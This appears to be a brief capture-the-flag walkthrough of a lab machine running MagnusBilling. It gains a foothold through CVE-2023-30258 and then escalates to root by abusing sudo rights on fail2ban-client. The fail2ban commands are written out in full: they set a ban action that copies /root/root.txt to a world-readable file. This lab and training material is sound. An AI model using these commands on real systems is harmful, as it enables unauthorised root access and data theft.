Started with a nmap scan
```
22 OpenSSH 8.4p1
80 Apache 2.4.56
3306 MariaDB 10.3.23
5038 Asterisk Call Manaher 2.10.6
```
Going to the webhost we get redirected to `mBiling` which is `magnus Billing` looking around for exploits I found one `CVE-2023-30258` and we get a call back as the user `astrisk` when running `sudo -l` we can run `fail2ban` as sudo with no a passowrd looking for writeable files we have `systemd-timesyncd.service` file and looking at the ban policy we can see its set to `1hr` there not much we can do with the file we can edit but `fail2ban` lets us run commands from the command line using `action` 
```
sudo /usr/bin/fail2ban-client restart
sudo /usr/bin/fail2ban-client set sshd action iptables-multipart actionban "/bin/bash -c 'cat /root/root.txt > /tmp/root.txt && chmod 777 /tmp/root.txt'"
sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1
cat /tmp/root.txt
```
Now we have the final root flag 